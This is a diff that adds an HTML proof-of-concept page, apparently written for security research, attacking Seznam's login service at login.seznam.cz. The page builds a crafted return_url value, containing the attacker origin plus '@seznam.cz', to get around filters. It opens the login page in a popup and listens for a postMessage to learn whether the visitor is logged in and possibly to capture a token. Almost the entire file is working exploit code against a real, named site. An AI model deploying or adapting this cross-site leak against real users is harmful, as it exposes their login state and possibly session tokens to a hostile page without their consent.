@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Seznam XS-Leak PoC</title>
+</head>
+<body>
+    <h2>XS-Leak Detection PoC</h2>
+    <div id="result">Waiting for user interaction...</div>
+    <button onclick="startAttack()">Check Login Status</button>
+
+    <script>
+        // CONFIGURATION
+        // The attacker's origin (this page's origin)
+        const attackerOrigin = window.location.origin;
+        
+        // The target URL
+        // We append /seznam.cz to the path to bypass potential 'contains' filters on the server,
+        // while ensuring the JS Regex extracts only the attackerOrigin.
+        const targetBase = "https://login.seznam.cz/loginDone";
+        const returnUrlPayload = attackerOrigin + "\@seznam.cz"; 
+        const targetUrl = `${targetBase}?return_url=${encodeURIComponent(returnUrlPayload)}`;
+
+        function startAttack() {
+            document.getElementById("result").innerText = "Opening popup...";
+            
+            // 1. Open the target as a popup
+            let popup = window.open(targetUrl, "leakyWindow", "width=500,height=500");
+
+            // 2. Setup the "Not Logged In" timeout
+            // If we don't receive a message within 2 seconds, we assume they aren't logged in
+            // (or the script didn't execute).
+            let timeoutID = setTimeout(() => {
+                popup.close();
+                document.getElementById("result").innerText = "Result: User is NOT logged in (Timeout)";
+                document.getElementById("result").style.color = "red";
+            }, 3000);
+
+            // 3. Listen for the postMessage
+            window.addEventListener("message", function(e) {
+                // Ensure the message comes from the expected target (optional but good practice)
+                // if (e.origin !== "https://login.seznam.cz") return;
+
+                try {
+                    // Parse the incoming data
+                    let data = typeof e.data === "string" ? JSON.parse(e.data) : e.data;
+
+                    if (data.status === 200) {
+                        // Success: We received the token/status
+                        clearTimeout(timeoutID);
+                        document.getElementById("result").innerText = "Result: User IS logged in (Status 200)";
+                        document.getElementById("result").style.color = "green";
+                        
+                        // 4. (Optional) Be polite and close the popup as the script expects
+                        e.source.postMessage("confirm", e.origin);
+                    }
+                } catch (err) {
+                    console.log("Received non-JSON message or error parsing:", err);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
